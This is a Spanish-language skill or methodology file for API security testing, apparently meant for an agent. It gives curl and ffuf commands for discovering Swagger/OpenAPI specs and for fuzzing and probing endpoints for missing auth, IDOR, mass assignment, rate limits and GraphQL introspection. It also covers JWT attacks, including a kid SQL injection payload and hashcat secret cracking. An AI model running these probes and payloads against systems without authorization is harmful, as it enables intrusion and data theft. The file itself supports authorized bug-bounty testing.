---
name: api-swagger-fuzz
description: "API testing: descubrir OpenAPI/Swagger, fuzzear endpoints sin auth, JWT attacks, mass assignment y rate limiting. Incluye wordlist de rutas API y PoCs de login/XSS en API."
version: 1.0.0
author: Fr4ndev
license: MIT
platforms: [linux, macos]
metadata:
  tags: [attack, api, swagger, openapi, graphql, jwt, fuzzing]
  tools: [curl, ffuf, jq]
  required: [curl]
  recommended: [ffuf]
  related_skills: [403-bypass, sqli-hunting, wayback-dorking]
  stage: attack
---

# API / Swagger Testing

## 1 — Descubrir la API

```bash
# wordlist de rutas API bundled
ffuf -u "https://target.com/FUZZ" -w wordlists/api.txt -mc all -fc 404 -o api_endpoints.json

# swagger/openapi expuestos
for p in swagger.json swagger.yaml openapi.json openapi.yaml api-docs v2/api-docs v3/api-docs \
         swagger-ui.html swagger/index.html docs/api redoc; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://target.com/$p"
done
# wordlist específica: tools/swagger/swagger-wordlist.txt
ffuf -u "https://target.com/FUZZ" -w tools/swagger/swagger-wordlist.txt -mc all -fc 404

# también desde archives: api-swagger-fuzz ← wayback-dorking/api_endpoints.txt
```

## 2 — Analizar spec descubierta

```bash
curl -s https://target.com/openapi.json | jq '.paths | keys[]'
curl -s https://target.com/openapi.json | jq '.components.schemas | keys[]'
# endpoints NO documentados suelen ser los rotos — compara con el fuzz
```

PoCs de request bundled: `tools/swagger/` (login.yaml, rlogin.yaml, xsscookie.yaml, xsstest.yaml — para probar flujos de auth y XSS reflejado en respuestas JSON).

## 3 — Batería de pruebas por endpoint

```bash
E="https://target.com/api/v1/resource/1"

# 3a. Auth: quita el header → ¿responde igual? (BAC)
curl -s "$E" -H "Authorization: Bearer invalid" | jq .   # 401 correcto
curl -s "$E"                                            # ¿200 sin auth? = bug

# 3b. IDOR: cambia el ID
curl -s "$E" -H "$AUTH" ; curl -s "${E%/*}/2" -H "$AUTH"   # ¿mismos campos de otro user?

# 3c. JWT attacks
# - none algorithm: cambia alg a "none", elimina firma
# - kid SQLi: {"kid":"1 OR 1=1--"}
# - weak secret: hashcat -m 16500 jwt.txt rockyou.txt
# wordlist de secrets: wordlists/jwt-secrets.txt

# 3d. Mass assignment
curl -s -X POST "$E" -H "$AUTH" -H "Content-Type: application/json" \
  -d '{"name":"x","role":"admin","is_verified":true}'    # campos extra aceptados?

# 3e. Rate limiting
for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " -X POST "https://target.com/api/login" \
  -d '{"user":"a","pass":"b"}'; done   # ¿429 alguna vez?

# 3f. GraphQL introspection
curl -s -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' | jq .
```

## 4 — Nivel de severidad esperado

| Hallazgo | Severity típico |
|---|---|
| Swagger expuesto sin datos sensibles | Info/Low |
| Endpoints admin sin auth | Critical |
| IDOR con PII | High/Critical |
| JWT crackeable + acceso a datos | High |
| Mass assignment → role escalation | High |
| GraphQL introspection + mutations abiertas | High |

## Reglas

- No modifiques datos de usuarios reales; usa cuentas propias cuando la escritura sea necesaria.
- Rate limit tests: párate al primer 429 o a 100 req.
